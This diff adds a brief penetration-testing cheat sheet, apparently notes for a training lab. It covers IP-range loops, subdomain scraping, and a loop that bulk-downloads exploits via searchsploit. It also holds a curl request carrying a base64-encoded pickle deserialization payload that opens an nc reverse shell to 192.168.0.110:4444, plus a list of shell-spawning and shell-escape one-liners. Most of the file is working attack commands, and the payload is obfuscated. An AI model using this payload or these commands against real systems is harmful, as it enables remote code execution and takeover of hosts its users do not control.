@@ -1,0 +1,30 @@
+# BUCLE FOR
+for ip in $(seq 1 10); do echo "10.10.10.$ip"; done
+for ip in {1..10}; do echo "10.10.10.$ip"; done
+
+grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpon e\.com" | head 
+grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpon e\.com" | awk -F "http://" '{print $2}' 
+grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpon e\.com" | awk -F "http://" '{print $2}' | cut -d "/" -f 1 
+grep -o '[^/]*\.megacorpone\.com' index.html | sort -u > list.txt 
+
+searchsploit afd windows -w -t | grep http | cut -f 2 -d "|" 
+for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|"); do exp_name=$(echo $e | cut -d "/" -f 5) && url=$(echo $e | sed 's/exploits/raw/') && wget -q --no-check-certificate $url -O $exp_name; done 
+for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done 
+
+# PROXY CON CURL
+curl -x "http://127.0.0.1:8080" -d "pickled=gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI-JjEgfCBuYyAxOTIuMTY4LjAuMTEwIDQ0NDQgPiAvdG1wL2aUhZRSlC4=" http://127.0.0.1:5000/hackme
+
+
+# SPAWNING TTY
+python -c ‘import pty; pty.spawn(“/bin/sh”)’
+echo os.system(‘/bin/bash’)
+/bin/sh -i
+perl -e ‘exec “/bin/sh”;’
+perl: exec “/bin/sh”;
+ruby: exec “/bin/sh”
+lua: os.execute(‘/bin/sh’)
+exec “/bin/sh” (Desde IRB)
+:!bash (Desde vi)
+:set shell=/bin/bash:shell (Desde vi)
+!sh (Desde nmap)
+find /etc/passwd -exec /bin/bash \;
